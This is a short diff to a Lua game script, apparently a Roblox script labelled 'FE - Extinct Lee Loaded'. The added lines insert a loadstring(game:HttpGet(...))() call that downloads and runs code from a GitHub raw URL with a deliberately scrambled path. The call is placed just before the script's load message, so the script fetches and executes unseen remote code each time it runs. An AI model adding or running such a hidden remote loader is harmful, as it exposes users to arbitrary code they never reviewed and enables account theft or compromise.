@@ -1160,4 +1160,7 @@ while event:Wait() do
         end
     end
 end
+wait(.001)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImSnox/hvojwqdwck-hewncbd-fsdaxs/main/vgs/sff/CAVGS/SFDDD/CA/DBH/DFADC/SVG/SD/CVD/GFJGF/FS"))()
+wait(.001)
 print("FE - Extinct Lee Loaded - "..os.date())
